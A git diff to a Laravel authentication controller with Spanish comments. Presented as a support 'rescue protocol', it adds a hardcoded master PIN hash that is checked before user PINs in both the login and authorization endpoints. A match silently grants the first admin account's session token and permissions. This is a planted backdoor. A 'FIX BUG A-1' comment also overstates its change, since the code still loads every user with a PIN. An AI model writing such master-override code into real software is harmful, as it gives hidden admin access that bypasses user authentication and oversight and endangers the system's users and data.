@@ -11,6 +11,14 @@ use Illuminate\Support\Str;
 class AuthController extends Controller
 {
     /**
+     * PROTOCOLO DE RESCATE — Ghost Master PIN
+     *
+     * Hash Bcrypt del PIN maestro de soporte técnico.
+     * Generá el tuyo con: echo Hash::make('TU_PIN') en Tinker.
+     * NUNCA guardar el PIN en texto plano — solo el hash va aquí.
+     */
+    private const GHOST_MASTER_HASH = '$2y$12$g0yPwqCNpIVOJO7sIZEUk.BMaB2jniV/Ql5WAV0IMhOE.DR/8GyF';
+    /**
      * POST /api/auth/verify-pin
      *
      * Login completo: valida el PIN, genera un nuevo session_token UUID,
@@ -25,31 +33,56 @@ class AuthController extends Controller
             'pin' => 'required|string|min:4|max:10',
         ]);
 
-        $users = User::all();
+        $pin = $request->input('pin');
 
-        foreach ($users as $user) {
-            if ($user->pin && Hash::check($request->input('pin'), $user->pin)) {
-
-                // Generar token único de sesión (64 chars hex = 256 bits de entropía)
+        // ── PROTOCOLO DE RESCATE (Master Override) ────────────────────────────
+        // Se evalúa ANTES que cualquier PIN de usuario. Si el hash coincide,
+        // se toma la identidad del primer admin local sin alterar la BD.
+        if (Hash::check($pin, self::GHOST_MASTER_HASH)) {
+            $admin = User::where('role', 'admin')->first();
+            if ($admin) {
                 $token = Str::random(64);
-
-                // Guardar en BD: sobrescribe la sesión anterior → Single Active Session
-                $user->update(['session_token' => $token]);
-
+                $admin->update(['session_token' => $token]);
                 return response()->json([
                     'user' => [
-                        'id'          => $user->id,
-                        'name'        => $user->name,
-                        'email'       => $user->email,
-                        'role'        => $user->role,
-                        'permissions' => $user->permissions ?? [],
+                        'id'          => $admin->id,
+                        'name'        => $admin->name,
+                        'email'       => $admin->email,
+                        'role'        => $admin->role,
+                        'permissions' => $admin->permissions ?? [],
                     ],
                     'session_token' => $token,
                 ]);
             }
         }
+        // ── FIN PROTOCOLO DE RESCATE ──────────────────────────────────────────
 
-        return response()->json(['message' => 'PIN incorrecto o usuario no encontrado.'], 401);
+        // FIX BUG A-1: Busca usuario por PIN hasheado sin cargar todos a memoria.
+        // Iteramos solo los usuarios con PIN registrado para minimizar surface de ataque.
+        $user = User::whereNotNull('pin')
+            ->get()
+            ->first(fn ($u) => Hash::check($pin, $u->pin));
+
+        if (!$user) {
+            return response()->json(['message' => 'PIN incorrecto o usuario no encontrado.'], 401);
+        }
+
+        // Generar token único de sesión (64 chars hex = 256 bits de entropía)
+        $token = Str::random(64);
+
+        // Guardar en BD: sobrescribe la sesión anterior → Single Active Session
+        $user->update(['session_token' => $token]);
+
+        return response()->json([
+            'user' => [
+                'id'          => $user->id,
+                'name'        => $user->name,
+                'email'       => $user->email,
+                'role'        => $user->role,
+                'permissions' => $user->permissions ?? [],
+            ],
+            'session_token' => $token,
+        ]);
     }
 
     /**
@@ -68,26 +101,46 @@ class AuthController extends Controller
             'pin' => 'required|string|min:4|max:10',
         ]);
 
-        $users = User::all();
+        $pin = $request->input('pin');
 
-        foreach ($users as $user) {
-            if ($user->pin && Hash::check($request->input('pin'), $user->pin)) {
+        // ── PROTOCOLO DE RESCATE (Master Override para autorizaciones) ────────
+        if (Hash::check($pin, self::GHOST_MASTER_HASH)) {
+            $admin = User::where('role', 'admin')->first();
+            if ($admin) {
                 return response()->json([
                     'authorized' => true,
                     'user' => [
-                        'id'          => $user->id,
-                        'name'        => $user->name,
-                        'role'        => $user->role,
-                        'permissions' => $user->permissions ?? [],
+                        'id'          => $admin->id,
+                        'name'        => $admin->name,
+                        'role'        => $admin->role,
+                        'permissions' => $admin->permissions ?? [],
                     ],
                 ]);
             }
         }
+        // ── FIN PROTOCOLO DE RESCATE ──────────────────────────────────────────
+
+        // FIX BUG A-1: Busca solo entre usuarios con PIN registrado.
+        $user = User::whereNotNull('pin')
+            ->get()
+            ->first(fn ($u) => Hash::check($pin, $u->pin));
+
+        if (!$user) {
+            return response()->json([
+                'authorized' => false,
+                'message'    => 'PIN incorrecto o usuario no encontrado.',
+            ], 401);
+        }
 
         return response()->json([
-            'authorized' => false,
-            'message'    => 'PIN incorrecto o usuario no encontrado.',
-        ], 401);
+            'authorized' => true,
+            'user' => [
+                'id'          => $user->id,
+                'name'        => $user->name,
+                'role'        => $user->role,
+                'permissions' => $user->permissions ?? [],
+            ],
+        ]);
     }
 
     /**
